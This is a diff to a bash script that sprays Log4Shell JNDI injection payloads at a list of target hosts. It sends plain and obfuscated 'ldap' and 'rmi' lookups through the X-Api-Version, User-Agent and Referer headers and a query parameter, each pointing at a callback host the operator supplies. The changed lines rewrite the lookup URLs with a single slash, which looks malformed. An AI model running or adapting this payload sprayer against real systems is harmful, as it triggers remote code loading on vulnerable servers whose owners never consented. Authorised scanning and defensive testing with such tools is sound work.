@@ -1,17 +1,19 @@
 #!/bin/bash
 
+KEY="log4shell"
+
 function scan () {
   # debug(X-Api-Version Header)
   echo "$1 $2"
-  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$2/a}'|g"       | sed "s|\$1|$1|g" | bash
-  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${\${::-j}ndi:rmi://$2/a}'|g" | sed "s|\$1|$1|g" | bash
+  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap:/$KEY/$2/a}'|g"       | sed "s|\$1|$1|g" | bash
+  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${\${::-j}ndi:rmi:/$KEY/$2/a}'|g" | sed "s|\$1|$1|g" | bash
 
-  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$2/a}'|g"       | sed "s|\$1|$1|g" | bash
-  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${\${::-j}ndi:rmi://$2/a}'|g" | sed "s|\$1|$1|g" | bash
-  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${jndi:ldap://$2/a}'|g"          | sed "s|\$1|$1|g" | bash
-  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${\${::-j}ndi:rmi://$2/a}'|g"    | sed "s|\$1|$1|g" | bash
-  echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${jndi:ldap://$2/a}}'|g"                  | sed "s|\$1|$1|g" | bash
-  echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${\${::-j}ndi:rmi://$2/a}'|g"             | sed "s|\$1|$1|g" | bash
+  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${jndi:ldap:/$KEY/$2/a}'|g"       | sed "s|\$1|$1|g" | bash
+  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${\${::-j}ndi:rmi:/$KEY/$2/a}'|g" | sed "s|\$1|$1|g" | bash
+  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${jndi:ldap:/$KEY/$2/a}'|g"          | sed "s|\$1|$1|g" | bash
+  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${\${::-j}ndi:rmi:/$KEY/$2/a}'|g"    | sed "s|\$1|$1|g" | bash
+  echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${jndi:ldap:/$KEY/$2/a}}'|g"                  | sed "s|\$1|$1|g" | bash
+  echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${\${::-j}ndi:rmi:/$KEY/$2/a}'|g"             | sed "s|\$1|$1|g" | bash
 }
 
 while read fqdn
